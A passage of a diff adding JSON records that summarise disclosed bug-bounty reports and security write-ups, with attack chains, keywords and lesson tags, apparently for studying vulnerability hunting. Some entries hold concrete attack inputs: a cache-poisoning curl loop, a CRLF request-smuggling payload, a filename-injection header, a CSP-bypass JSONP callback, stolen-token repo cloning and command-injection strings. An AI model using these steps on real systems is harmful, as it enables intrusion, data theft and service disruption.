+   "mechanic": "The authorization check correctly rejected the action with HTTP 422 but serialized the target object into the error response's `context.subject`.",
+   "chain": [
+    "Free low-privilege account at `hackerone.com/vdp-sign-up`",
+    "Pick other programs' report ids (test reports listed at `hackerone.com/security?type=team`)",
+    "`POST /reports/[ID]/reference.json` with body `{}`, own session cookie and own `X-Csrf-Token`",
+    "Read private report data from `context.subject` of the 422"
+   ],
+   "impact_proof": "Team's repro uses approved test reports that \"contain flags to include in your POC\"; hunter's own PoC not published.",
+   "keywords": [
+    "422 denial carries data",
+    "context.subject",
+    "error object serialization",
+    "reference.json",
+    "own csrf token satisfies the check",
+    "read the denial response"
+   ],
+   "lesson": "body-not-status"
+  },
+  {
+   "id": "h1-30",
+   "source_url": "https://hackerone.com/reports/1618347",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$25,000",
+   "classes": [
+    "graphql",
+    "missing_authorization",
+    "info-leak"
+   ],
+   "first_signal": "Only \"Just a recent update gives the results of private programs\"; the trigger artifact is not stated",
+   "mechanic": "The unauthenticated GraphQL `node(id:)` resolver had no per-type authorization, so a hand-built Relay global id returned private objects.",
+   "chain": [
+    "Unauthenticated GraphQL `node(id:)` with a hand-built gid ending `PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287` requesting `... on PolicyPageAssetGroupDocument{id,name}`",
+    "Response returns the private program's asset `name`",
+    "Enumerate ids for program names, scope details and report titles"
+   ],
+   "impact_proof": "One request \"Without authorization\" returning a populated (redacted) `name`.",
+   "keywords": [
+    "relay global id",
+    "node(id:) resolver",
+    "hand-built gid",
+    "inline fragment on type",
+    "unauthenticated enumeration",
+    "no per-type authorization"
+   ],
+   "lesson": "sibling-interface"
+  },
+  {
+   "id": "h1-31",
+   "source_url": "https://hackerone.com/reports/2032716",
+   "set": "hackerone",
+   "severity": "high",
+   "bounty": "$12,500",
+   "classes": [
+    "graphql",
+    "info-leak",
+    "business-logic"
+   ],
+   "first_signal": "Clicked the edit pen in the collaborators panel while capturing traffic - \"you will see the user email in first request\"; the field is `\"username_or_email\"` inside `\"operationName\":\"SaveCollaboratorsMutation\"`",
+   "mechanic": "A pending collaborator invite made the target's private email available in the editor's mutation payload, so acceptance never gated the disclosure.",
+   "chain": [
+    "Create a dummy report",
+    "Invite any hacker by username (cap: max 2 invites per report); the target stays pending",
+    "Reopen the editor; the mutation (`report_id`, `collaborators[]`, `bounty_weight`) carries the target's private email"
+   ],
+   "impact_proof": "Sample request with values redacted; claimed the email of \"todayisnew, Hacker 1 rank in H1\"; video PoC with the link redacted.",
+   "keywords": [
+    "savecollaboratorsmutation",
+    "username_or_email",
+    "pending invite",
+    "edit pen captures traffic",
+    "pii in mutation payload"
+   ],
+   "lesson": "body-not-status"
+  },
+  {
+   "id": "h1-32",
+   "source_url": "https://hackerone.com/reports/1819832",
+   "set": "hackerone",
+   "severity": "high",
+   "bounty": "$15,000",
+   "classes": [
+    "idor",
+    "graphql"
+   ],
+   "first_signal": "Two observables placed together - \"In delete request there is parameter of id\" and the public share URL `https://story.snapchat.com/spotlight/<redacted>` containing the same id",
+   "mechanic": "The delete mutation had authentication but no ownership check on the supplied story ids.",
+   "chain": [
+    "Delete your own post at my.snapchat.com/myposts and capture `operationName: DeleteStorySnaps` with `storyType: SPOTLIGHT_STORY` in Burp",
+    "Swap `ids` for another user's video id and the other user's video is deleted"
+   ],
+   "impact_proof": "Stated video PoC; no attachment present in the disclosed data.",
+   "keywords": [
+    "deletestorysnaps",
+    "ids parameter swap",
+    "id visible in public share url",
+    "spotlight_story",
+    "destructive mutation without ownership check"
+   ],
+   "lesson": "client-supplied-field"
+  },
+  {
+   "id": "h1-33",
+   "source_url": "https://hackerone.com/reports/3124517",
+   "set": "hackerone",
+   "severity": "high",
+   "bounty": "$10,000",
+   "classes": [
+    "idor",
+    "missing_authorization",
+    "info-leak"
+   ],
+   "first_signal": null,
+   "mechanic": "Diff/compare between a repo you can access and a private repo you cannot returns the private repo's code.",
+   "chain": [
+    "Access to any repo on the instance",
+    "Know the private repo name plus a branch, tag or commit SHA",
+    "Trigger compare/diff and read the leaked code"
+   ],
+   "impact_proof": "Not stated; body `no-content`. Endpoints and parameters not stated.",
+   "keywords": [
+    "compare/diff across repos",
+    "private repo name plus sha",
+    "diff as oracle",
+    "cross-repo authz",
+    "cve-2025-8447"
+   ],
+   "lesson": "oracle"
+  },
+  {
+   "id": "h1-34",
+   "source_url": "https://hackerone.com/reports/415081",
+   "set": "hackerone",
+   "severity": "high",
+   "bounty": "$10,500",
+   "classes": [
+    "idor",
+    "missing_authorization"
+   ],
+   "first_signal": null,
+   "mechanic": "`/businessmanage/users/api/v1/users` let a business owner assign secondary users from other accounts, who would then be granted access to the login.",
+   "chain": [
+    "Business owner calls `/businessmanage/users/api/v1/users`",
+    "Assign secondary users belonging to other accounts",
+    "Those users are granted access to the login"
+   ],
+   "impact_proof": "Not stated; body empty.",
+   "keywords": [
+    "/businessmanage/users/api/v1/users",
+    "assign secondary users cross-account",
+    "multi-tenant user assignment"
+   ],
+   "lesson": "other"
+  },
+  {
+   "id": "h1-35",
+   "source_url": "https://hackerone.com/reports/689314",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$12,000",
+   "classes": [
+    "missing_authorization",
+    "business-logic"
+   ],
+   "first_signal": "Source review of `ee/app/controllers/ee/projects_controller.rb`, permitted params `use_custom_template` and `group_with_project_templates_id` (plus CE's `template_name`) - parameters you would never see in normal traffic",
+   "mechanic": "Creating the project in a personal namespace skips the namespace/descendant check, and the template finder filters by visibility only, so a public project with members-only features can be exported into the attacker's project.",
+   "chain": [
+    "`validate_namespace_used_with_template` begins `return unless project.group`, so creating the project in a personal namespace skips the descendant check and the attacker-supplied group id survives",
+    "`available_custom_project_templates` returns `::Project.where(namespace_id: group_id)`; `ProjectsFinder` filters by visibility only and does not check the user's access level, so a public project with members-only repo/issues/snippets is selectable",
+    "`custom_template.add_export_job` under `CustomTemplateExportImportStrategy`; the Sidekiq export worker assumes authorization and imports into the attacker's project"
+   ],
+   "impact_proof": "Two-account PoC (public project with features set to \"Only Project Members\"; attacker intercepts `POST /projects` and sets the three params); minutes later repo, confidential issues, private snippets, MRs and pipelines are present. Real-world: screenshot of a redacted copy of `gitlab-com/finance`.",
+   "keywords": [
+    "permitted params not in live traffic",
+    "use_custom_template",
+    "group_with_project_templates_id",
+    "return unless project.group",
+    "projectsfinder visibility only",
+    "sidekiq job assumes authorization"
+   ],
+   "lesson": "client-supplied-field"
+  },
+  {
+   "id": "h1-36",
+   "source_url": "https://hackerone.com/reports/509924",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$12,000",
+   "classes": [
+    "info-leak",
+    "missing_authorization",
+    "secret-exposure"
+   ],
+   "first_signal": "The JSON response of `/:namespace/:project/notes` after a quick action - it contains `commands_changes.target_project` with `\"runners_token\"` and `\"runners_token_encrypted\"`",
+   "mechanic": "The quick-action interpreter resolved the target project without access control and serialized the whole model into the notes JSON response.",
+   "chain": [
+    "Comment `/move <full path of any other project>` in your own issue",
+    "The interpreter resolves the target project without access control and serializes the whole model, returning plaintext and encrypted runner tokens",
+    "Register a runner on the victim project for secret CI variables and arbitrary code in their environment (described, not performed)"
+   ],
+   "impact_proof": "Redacted real gitlab.com response for a private project (`\"visibility_level\": 0`) with `\"runners_token\": \"mzssqx69THU<redacted>\"`; the same response also said `\"valid\": false`, so the action failed and the data leaked anyway.",
+   "keywords": [
+    "quick action /move",
+    "commands_changes.target_project",
+    "runners_token",
+    "over-serialization of the model",
+    "\"valid\": false with data present",
+    "read the failure response"
+   ],
+   "lesson": "body-not-status"
+  },
+  {
+   "id": "h1-37",
+   "source_url": "https://hackerone.com/reports/446585",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$11,000",
+   "classes": [
+    "business-logic",
+    "missing_authorization"
+   ],
+   "first_signal": "\"When looking into this feature\" (import); the exploited observable is `\"template\":false` inside the `services` array of the exported `project.json`",
+   "mechanic": "Project import trusted an admin-only boolean in the export file, so flipping `\"template\":true` installed an instance-wide service template.",
+   "chain": [
+    "Edit your own export and flip `\"template\":true` with any service `type`",
+    "Import creates an instance-wide service template, normally admin-only",
+    "`create_services_from_active_templates` runs `Service.where(template: true, active: true)` and installs it into every project created afterwards, across all users",
+    "Payload depends on the service: `EmailsOnPushService` mails commit diffs out, `HipchatService` exfiltrates issues/notes/MRs including confidential ones, `MockCiService` is hidden from the UI and calls an attacker URL, `ExternalWikiService`/`CustomIssueTrackerService` re-point links"
+   ],
+   "impact_proof": "PoC tar injecting a `MockCiService` template; a second user creates a project and exports it, and the new `project.json` contains the service created for the other project. Slack mutation \"not confirmed\". Side finding: import also sets admin-only `custom_attributes`.",
+   "keywords": [
+    "\"template\":true in project.json",
+    "create_services_from_active_templates",
+    "admin-only flag inside import file",
+    "instance-wide persistence",
+    "mockciservice hidden from ui",
+    "custom_attributes"
+   ],
+   "lesson": "client-supplied-field"
+  },
+  {
+   "id": "h1-38",
+   "source_url": "https://hackerone.com/reports/894569",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$12,000",
+   "classes": [
+    "business-logic"
+   ],
+   "first_signal": null,
+   "mechanic": "A pull mirror set up by an account that is then deleted leaves the victim Owner as the pipeline triggerer, so mirror updates run pipelines with the victim's `$CI_JOB_TOKEN`.",
+   "chain": [
+    "attacker1 creates a public repo `poc` with a harmless `.gitlab-ci.yml`",
+    "attacker2 creates group `test`, sets a pull mirror of attacker1's repo with \"Trigger pipelines for mirror updates\", invites the victim as Owner, then deletes the attacker2 account",
+    "attacker1 rewrites `.gitlab-ci.yml`; about 30 minutes later the mirror update starts a pipeline whose triggerer is the victim user, so `$CI_JOB_TOKEN` carries victim access"
+   ],
+   "impact_proof": "CI script `git clone https://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.com/victim/private_repo_name.git`, `ls -lah .`, `cat README.md`. No captured output or attachments. Impact stated as \"stealing the CI_JOB_TOKEN of any user\".",
+   "keywords": [
+    "pull mirror trigger pipelines",
+    "orphaned ownership after account deletion",
+    "pipeline triggerer becomes victim",
+    "$ci_job_token",
+    "30-minute mirror sync wait",
+    "three identities"
+   ],
+   "lesson": "multi-identity"
+  },
+  {
+   "id": "h1-39",
+   "source_url": "https://hackerone.com/reports/300305",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$15,250",
+   "classes": [
+    "race-condition",
+    "business-logic",
+    "auth-bypass"
+   ],
+   "first_signal": "Shopify's public summary of report #270981, which said a collaborator request \"could be accepted automatically,\" \"with the user account converted into a collaborator account\" - he reproduced that and attacked the automatic conversion",
+   "mechanic": "Email change and email confirmation are not in one transaction, so a confirmation link saved before a second change request confirms an arbitrary address inside the 1,100-2,500 ms window.",
+   "chain": [
+    "Set the partner email to an attacker-owned address and save the confirmation link without opening it",
+    "Submit an email change to the victim staff member's address (that request takes 1,100-2,500 ms)",
+    "A few milliseconds later open the saved link in another tab, confirming an arbitrary email",
+    "Add the store under `/[ID]/managed_stores`; the employee's staff account auto-converts to a collaborator on the attacker's dashboard with no merchant involvement, giving store takeover"
+   ],
+   "impact_proof": "Partner account `698396` showing `cache@hackerone.com` confirmed - an address he \"would never be able to validate otherwise\"; store takeover on his own test store and employee; honest gap noted: \"maybe not necessary I didn't test\".",
+   "keywords": [
+    "toctou email confirmation",
+    "save the confirmation link without opening",
+    "1,100-2,500 ms window",
+    "managed_stores",
+    "collaborator auto-conversion",
+    "read another disclosed report first"
+   ],
+   "lesson": "multi-identity"
+  },
+  {
+   "id": "h1-40",
+   "source_url": "https://hackerone.com/reports/1330529",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$3,250",
+   "classes": [
+    "business-logic",
+    "idor",
+    "auth-bypass"
+   ],
+   "first_signal": "The send-OTP body `{\"number\":\"XXXXXXXXXX\",\"isdCode\":\"+91\",\"resId\":\"XXXXXXXXXX\"}` to `POST /restaurant-onboard-diy/v2/send-auto-claim-otp` with Referer `/partner_with_us/ownership` - the client supplies both the destination phone and the resource id",
+   "mechanic": "The OTP proves control of a phone but is never bound to the `resId` at verification, so a valid requestId can claim another restaurant.",
+   "chain": [
+    "Request an OTP for your own restaurant to your own number, getting a genuine `{\"message\":\"OTP SENT\",\"requestId\":XXXXXXX}`",
+    "Call `verify-auto-claim-otp` with `{\"verificationCode\":XXX,\"requestId\":\"XXXXXXXX\",\"resId\":\"<victim>\"}`",
+    "Server maps the attacker email as Owner/Manager of the victim restaurant"
+   ],
+   "impact_proof": "The two request bodies plus the mapping statement; no media, verify response not shown; team confirms takeover of an unclaimed restaurant. Precondition: attacker owns a restaurant page with phone mapped to email; only works on unclaimed listings.",
+   "keywords": [
+    "send-auto-claim-otp",
+    "requestid not bound to resid",
+    "client supplies destination phone and resource id",
+    "idor on the second step",
+    "verification binding"
+   ],
+   "lesson": "client-supplied-field"
+  },
+  {
+   "id": "h1-41",
+   "source_url": "https://hackerone.com/reports/307239",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$10,000",
+   "classes": [
+    "business-logic"
+   ],
+   "first_signal": null,
+   "mechanic": "Mishandled PayPal transaction states allowed a withdrawal to be paid out but not have the funds deducted from the account, giving a double payout.",
+   "chain": [
+    "Initiate a withdrawal through PayPal",
+    "Transaction-state handling pays out without deducting the funds (steps not stated)"
+   ],
+   "impact_proof": "Not stated; body empty. Race/idempotency detail and amounts not stated.",
+   "keywords": [
+    "paypal transaction states",
+    "payout without deduction",
+    "double payout",
+    "payment state machine"
+   ],
+   "lesson": "other"
+  },
+  {
+   "id": "h1-42",
+   "source_url": "https://hackerone.com/reports/1212067",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$16,000",
+   "classes": [
+    "xss",
+    "file-upload"
+   ],
+   "first_signal": "The design-link regex in `design.rb` - `valid_char = %r{[^/\\s]} # any char that is not a forward slash or whitespace` - with the note that \"this allows for any other special characters (such as quotes) to be matched\"",
+   "mechanic": "An alternate upload path lets a quote into a design filename; the reference filter interpolates it into `href=\"...\"` unescaped and the ReferenceRedactor rebuilds the node as raw HTML.",
+   "chain": [
+    "Upload a design whose filename carries a quote by sending `Content-Disposition: filename*=ASCII-8BIT''bbb%22class%3D%22gfm%22a%3D%27.png`, producing design name `bbb\"class=\"gfm\"a='.png` and skipping Workhorse/CarrierWave::SanitizedFile",
+    "Reference it in markdown inside an `<a>` whose text starts with `'`; `AbstractReferenceFilter` interpolates into `href=\"#{url}\"` unescaped, giving attribute injection",
+    "Inject `data-reference-type=\"design\"`, `data-design`, `data-issue` and HTML-encoded `data-original`; ReferenceRedactor rebuilds the node as raw HTML via `%(<a href=\"#{href}\">#{content}</a>)`, giving arbitrary HTML",
+    "CSP bypass with Google's JSONP endpoint: `q=alert(document.domain);//&callback=setTimeout`"
+   ],
+   "impact_proof": "Live PoC on gitlab.com at `/vakzz-h1/design-xss/-/issues/3` with `xss.mp4`. API-token theft referenced (report 1122227) but not demonstrated.",
+   "keywords": [
+    "filename*=ascii-8bit",
+    "alternate upload path skips sanitizer",
+    "valid_char regex",
+    "referenceredactor raw html rebuild",
+    "bare attribute injection",
+    "jsonp callback=settimeout csp bypass"
+   ],
+   "lesson": "composition"
+  },
+  {
+   "id": "h1-43",
+   "source_url": "https://hackerone.com/reports/488147",
+   "set": "hackerone",
+   "severity": "high",
+   "bounty": "$18,900",
+   "classes": [
+    "request-smuggling",
+    "cache-poison"
+   ],
+   "first_signal": null,
+   "mechanic": "A configuration in the frontend caching servers let a smuggled request turn a page request into a cached redirect.",
+   "chain": [
+    "HTTP request smuggling at the front end",
+    "Poison the cache entry",
+    "Legitimate users of /signin get attacker content"
+   ],
+   "impact_proof": "Not stated; body empty, PortSwigger write-up cited.",
+   "keywords": [
+    "front-end smuggling",
+    "cached redirect",
+    "/signin cache entry",
+    "poison a cacheable page"
+   ],
+   "lesson": "composition"
+  },
+  {
+   "id": "h1-44",
+   "source_url": "https://hackerone.com/reports/510152",
+   "set": "hackerone",
+   "severity": "high",
+   "bounty": "$20,000",
+   "classes": [
+    "request-smuggling",
+    "cache-poison"
+   ],
+   "first_signal": "The signal is in the title: it is a bypass of the fix for report #488147",
+   "mechanic": "Bypass of the fix for the earlier smuggling/cache-poisoning report; bypass mechanism not stated.",
+   "chain": [
+    "Re-test the deployed fix for #488147",
+    "Reach the same smuggling-to-cache-poisoning outcome by a route the fix does not cover (not stated)"
+   ],
+   "impact_proof": "Not stated; body empty. Pair #488147/#510152 is the clearest \"re-test the patch\" datapoint with a dollar figure on both sides.",
+   "keywords": [
+    "bypass of the previous fix",
+    "re-test the patch",
+    "same hunter paid twice",
+    "smuggling to cache poisoning"
+   ],
+   "lesson": "patch-bypass"
+  },
+  {
+   "id": "h1-45",
+   "source_url": "https://hackerone.com/reports/1478633",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$6,000",
+   "classes": [
+    "request-smuggling",
+    "auth-bypass",
+    "host-header"
+   ],
+   "first_signal": "The engine \"allows the use of hexadecimal escape sequences in string manipulation functions such as `concat()`\" (for example `\\x0a\\x0d`); what drew him there is not stated",
+   "mechanic": "Hex escapes in Transform Rules let CR/LF into an outgoing header, giving a TE.CL desync toward the origin and bypassing Cloudflare Access.",
+   "chain": [
+    "Rule value `concat(\"-\", \"\\x0d\\x0aTransfer-Encoding: chunked\")` injects CRLF into an outgoing header",
+    "TE.CL desync toward the origin",
+    "Body `0\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: internal.example.com\\r\\n\\r\\n` smuggles a second request, bypassing Cloudflare Access and reading internal origin content"
+   ],
+   "impact_proof": "Internal origin content read behind Cloudflare Access; fixed within hours.",
+   "keywords": [
+    "hex escape \\x0d\\x0a in concat()",
+    "transform rules header rewrite",
+    "te.cl desync",
+    "auth proxy bypass",
+    "lack of output sanitation",
+    "verify the authorization jwt at origin"
+   ],
+   "lesson": "composition"
+  },
+  {
+   "id": "h1-46",
+   "source_url": "https://hackerone.com/reports/1096609",
+   "set": "hackerone",
+   "severity": "medium",
+   "bounty": "$2,900",
+   "classes": [
+    "cache-poison",
+    "host-header"
+   ],
+   "first_signal": "The Host header's port reflected into the page - request `Host: themes.shopify.com:1337`, response `<link rel=\"canonical\" href=\"https://themes.shopify.com:1337/\">`; cites PortSwigger \"web-cache-entanglement\"",
+   "mechanic": "The Host port is unkeyed but reflected into the cached response, so a poisoned entry points visitors at a closed port.",
+   "chain": [
+    "Unkeyed Host-port reflection into the canonical link",
+    "Loop the request to get it cached: `curl -ik \"https://themes.shopify.com:443/?g4mm4=hitthecache\" -H \"Host: themes.shopify.com:1337\"`",
+    "Normal visitors get assets on a closed port, which is a denial of service"
+   ],
+   "impact_proof": "Two terminals, one poisoning and one clean `grep \":1337\"` showing the poisoned canonical; screenshot `PoC-Host-Header-cache-poisoned-DoS.png`. The report does not explain why the `?g4mm4=` entry matched plain `/`.",
+   "keywords": [
+    "unkeyed host port",
+    "link rel=canonical reflection",
+    "web cache entanglement",
+    "loop to get cached",
+    "clean-request grep as proof",
+    "dos-only impact stays medium"
+   ],
+   "lesson": "composition"
+  },
+  {
+   "id": "h1-47",
+   "source_url": "https://hackerone.com/reports/1087489",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$50,000",
+   "classes": [
+    "secret-exposure"
+   ],
+   "first_signal": "In a public macOS Electron app by a Shopify employee, `npx asar extract` on `app.asar` \"found a `.env` file\" - first dismissed as config, then noticed \"the app never loaded it\", \"likely a leftover of the release building process\", containing \"a `GH_TOKEN` variable\"",
+   "mechanic": "A GitHub token left in an unused `.env` inside a shipped Electron bundle belonged to an org member with push rights on all repos.",
+   "chain": [
+    "Extract the application bundle and read the unused `.env`",
+    "Validate: `curl -H \"Authorization: token $GH_TOKEN\" https://api.github.com/user`",
+    "`/user/orgs` lists Shopify; `/orgs/Shopify/repos` returns private repos with `\"permissions\": {\"admin\": false, \"push\": true, \"pull\": true}`",
+    "Read and write access to all Shopify repos, \"potentially permitting me to place backdoors\""
+   ],
+   "impact_proof": "SHA-512 of `README.md` in the private `github.com/Shopify/shopify` at commit `cea9c273391d` as read proof without copying data; the permissions object as write proof; no push performed.",
+   "keywords": [
+    "npx asar extract",
+    "unused .env in release bundle",
+    "gh_token",
+    "/user then /user/orgs then /orgs/<org>/repos",
+    "permissions object as write proof",
+    "sha-512 of a private file instead of its contents"
+   ],
+   "lesson": "secret-validation"
+  },
+  {
+   "id": "h1-48",
+   "source_url": "https://hackerone.com/reports/591813",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$39,999.99",
+   "classes": [
+    "secret-exposure"
+   ],
+   "first_signal": null,
+   "mechanic": "\"A username and certificate was found\" in a git repository, giving API access to Phabricator on code.uberinternal.com.",
+   "chain": [
+    "Find a username and certificate in a git repository (discovery method not stated)",
+    "Use them for API access to the internal Phabricator instance"
+   ],
+   "impact_proof": "Not stated; report `no-content`.",
+   "keywords": [
+    "username and certificate in a git repo",
+    "phabricator api access",
+    "code.uberinternal.com",
+    "internal app via leaked credential"
+   ],
+   "lesson": "secret-validation"
+  },
+  {
+   "id": "h1-49",
+   "source_url": "https://hackerone.com/reports/838635",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$12,500",
+   "classes": [
+    "api-misconfig",
+    "secret-exposure"
+   ],
+   "first_signal": null,
+   "mechanic": "Spring Boot Actuator `/heapdump` and `/env` were publicly reachable due to insufficient access control, and separately the shared auth library never expired or invalidated tokens, allowing replay.",
+   "chain": [
+    "Reach `/heapdump` and `/env` without authentication",
+    "Shared auth library never expires or invalidates tokens, so a token can be replayed (whether the reporter linked heapdump to token replay is explicitly uncertain)"
+   ],
+   "impact_proof": "Not stated; body empty. Bounty was reduced \"due to not being able to retrieve specific data\" - Critical finding, payout cut for missing data proof.",
+   "keywords": [
+    "spring boot actuator",
+    "/heapdump",
+    "/env",
+    "token never invalidated",
+    "token replay",
+    "payout cut for no data proof"
+   ],
+   "lesson": "secret-validation"
+  },
+  {
+   "id": "h1-50",
+   "source_url": "https://hackerone.com/reports/3113398",
+   "set": "hackerone",
+   "severity": "high",
+   "bounty": "$12,500",
+   "classes": [
+    "api-misconfig",
+    "info-leak"
+   ],
+   "first_signal": null,
+   "mechanic": "\"External access to HackerOne's internal Confluence documentation through a support system misconfiguration\"; steps not stated.",
+   "chain": [
+    "Support system workflows \"could be leveraged to gain unauthorized access to internal resources\" (steps not stated)"
+   ],
+   "impact_proof": "Impact includes \"ability to view and modify limited content\". Steps not stated; report `no-content`.",
+   "keywords": [
+    "support system misconfiguration",
+    "internal confluence",
+    "support workflow as entry",
+    "view and modify limited content"
+   ],
+   "lesson": "other"
+  },
+  {
+   "id": "h1-51",
+   "source_url": "https://hackerone.com/reports/383127",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$25,000",
+   "classes": [
+    "sqli"
+   ],
+   "first_signal": null,
+   "mechanic": "\"An unvalidated parameter on an partner reporting page (report_xml.php)\" - blind SQLi via the array parameter `countryFilter[]`, behind an Akamai WAF that he bypassed with a technique he withheld.",
+   "chain": [
+    "Reach `report_xml.php` on the partner reporting page",
+    "Inject through the array-shaped parameter `countryFilter[]`",
+    "Bypass the Akamai WAF (technique withheld: \"Wait for the write-up ;)\")"
+   ],
+   "impact_proof": "Not stated; body empty. Payloads not stated. Note the array-shaped parameter again, as in report 2293343.",
+   "keywords": [
+    "report_xml.php",
+    "countryfilter[] array parameter",
+    "blind sqli",
+    "akamai waf bypass withheld",
+    "array-shaped parameter"
+   ],
+   "lesson": "client-supplied-field"
+  },
+  {
+   "id": "wu-01",
+   "source_url": "https://labs.watchtowr.com",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "auth-bypass",
+    "info-leak"
+   ],
+   "first_signal": "A 302 to login with a non-zero body",
+   "mechanic": "Execution after redirect: the handler renders the page and then redirects without returning, so admin page content is present in the unauthenticated response.",
+   "chain": [
+    "Request an admin page unauthenticated on ShareFile",
+    "Response is a 302 to login but carries a non-zero body",
+    "Read the rendered admin page content out of that body"
+   ],
+   "impact_proof": "Admin page content in the unauthenticated response.",
+   "keywords": [
+    "execution-after-redirect",
+    "302 with non-zero body",
+    "redirect without return",
+    "read the body not the status",
+    "sharefile"
+   ],
+   "lesson": "body-not-status"
+  },
+  {
+   "id": "wu-02",
+   "source_url": "https://bergee blog (site and title only; slug lost to compaction)",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "auth-bypass",
+    "info-leak"
+   ],
+   "first_signal": "Same 302-with-a-body execution-after-redirect signal, on a forgotten appliance under a corporate subdomain",
+   "mechanic": "Execution after redirect on a forgotten Red Bull NetSUS appliance reachable under a corporate subdomain.",
+   "chain": [
+    "Find a forgotten appliance under a corporate subdomain",
+    "Request the gated page and read the body served alongside the redirect"
+   ],
+   "impact_proof": "Not stated beyond the content being served in the redirect response.",
+   "keywords": [
+    "execution-after-redirect",
+    "forgotten appliance",
+    "corporate subdomain",
+    "netsus",
+    "body served with the redirect"
+   ],
+   "lesson": "body-not-status"
+  },
+  {
+   "id": "wu-03",
+   "source_url": "https://www.wiz.io",
+   "set": "writeup",
+   "severity": "high",
+   "bounty": null,
+   "classes": [
+    "rce",
+    "parser-differential",
+    "other"
+   ],
+   "first_signal": "A push option concatenated into the internal `X-Stat` header",
+   "mechanic": "A push option is concatenated into the internal `X-Stat` header, which a second parser reads last-write-wins on `;`, so `rails_env` and the hooks directory can be overridden.",
+   "chain": [
+    "Supply a push option that is concatenated into the internal `X-Stat` header",
+    "The downstream parser splits on `;` with last-write-wins semantics",
+    "Override `rails_env` and the hooks directory",
+    "Remote code execution as `uid=500(git)`"
+   ],
+   "impact_proof": "RCE proven as `uid=500(git)` (GHES CVE-2026-3854, CVSS 8.7).",
+   "keywords": [
+    "x-stat internal header",
+    "delimiter injection on ;",
+    "last-write-wins parsing",
+    "rails_env override",
+    "hooks directory override",
+    "second parser"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "wu-04",
+   "source_url": "https://saurinn blog (site and title only; slug lost to compaction)",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": "$10,000",
+   "classes": [
+    "rce",
+    "ssrf"
+   ],
+   "first_signal": "Collaborator log showed `User-Agent: curl/7.x` coming from the target",
+   "mechanic": "The outbound User-Agent revealed a shell-out to curl, and `$IFS` in the argument gave command injection to root; a second bug was a URL validator accepting `?;id` and `#;id`.",
+   "chain": [
+    "Read the Collaborator log and see `User-Agent: curl/7.x` from the target, proving a shell-out",
+    "Inject with `$IFS` to work around argument separation",
+    "Command execution as root",
+    "Second bug: the URL validator accepted `?;id` and `#;id`"
+   ],
+   "impact_proof": "Root command execution; $10,000, rated \"Exceptional\".",
+   "keywords": [
+    "outbound user-agent fingerprint",
+    "curl/7.x in collaborator log",
+    "shell-out detection",
+    "$ifs separator",
+    "?;id url validator bypass"
+   ],
+   "lesson": "oracle"
+  },
+  {
+   "id": "wu-05",
+   "source_url": "https://slcyber.io",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "xss",
+    "cache-poison",
+    "open-redirect"
+   ],
+   "first_signal": null,
+   "mechanic": "A sanitizer reserialization namespace bypass plus `Cache-Control: no-cache=\"Content-Security-Policy\"` stripping CSP from the cached copy, entered through an open redirect, gives XSS on www.cloudflare.com.",
+   "chain": [
+    "Sanitizer reserialization namespace bypass through `/cdn-cgi/image`",
+    "`Cache-Control: no-cache=\"Content-Security-Policy\"` strips CSP from the cached copy",
+    "Open redirect used as the entry point",
+    "XSS on www.cloudflare.com"
+   ],
+   "impact_proof": "XSS on www.cloudflare.com.",
+   "keywords": [
+    "/cdn-cgi/image",
+    "sanitizer reserialization",
+    "namespace confusion",
+    "no-cache=\"content-security-policy\"",
+    "csp stripped from cached copy",
+    "open redirect as entry"
+   ],
+   "lesson": "composition"
+  },
+  {
+   "id": "wu-06",
+   "source_url": "https://slcyber.io",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "xss",
+    "cache-poison",
+    "lfi"
+   ],
+   "first_signal": "A cookie-driven self-XSS next to an anonymous Redis cache keyed on User-Agent only",
+   "mechanic": "A cookie-driven self-XSS becomes stored XSS for everyone because the anonymous Redis cache is keyed on User-Agent only; `strict-dynamic` is bypassed via modulepreload, and `dominant_color` is a 3-byte oracle for file read.",
+   "chain": [
+    "Cookie-driven self-XSS in Discourse",
+    "Anonymous Redis cache keyed on User-Agent only stores the poisoned page for all anonymous users",
+    "`strict-dynamic` CSP bypassed with modulepreload",
+    "Separately `dominant_color` acts as a 3-byte oracle giving file read"
+   ],
+   "impact_proof": "Stored XSS for all anonymous users; file read via the colour oracle (CVE-2026-55420/55674).",
+   "keywords": [
+    "self-xss promoted by cache",
+    "redis cache keyed on user-agent",
+    "strict-dynamic modulepreload bypass",
+    "dominant_color 3-byte oracle",
+    "anonymous cache key"
+   ],
+   "lesson": "composition"
+  },
+  {
+   "id": "wu-07",
+   "source_url": "https://parsasec blog (site and title only; slug lost to compaction)",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": "$15,000",
+   "classes": [
+    "missing_authorization",
+    "sibling-interface"
+   ],
+   "first_signal": "`Next-Action` header plus 40-42 hex action ids visible in the bundle and a `text/x-component` response",
+   "mechanic": "A Next.js Server Action carries no authorization of its own, so a low-privilege caller can invoke a privileged operation directly.",
+   "chain": [
+    "Extract 40-42 hex Server Action ids from the client bundle",
+    "POST with the `Next-Action` header and read the `text/x-component` response",
+    "The action performs the privileged operation for a low-privilege caller"
+   ],
+   "impact_proof": "Privileged operation performed for a low-privilege caller; read to character 100k of a 274k response.",
+   "keywords": [
+    "next-action header",
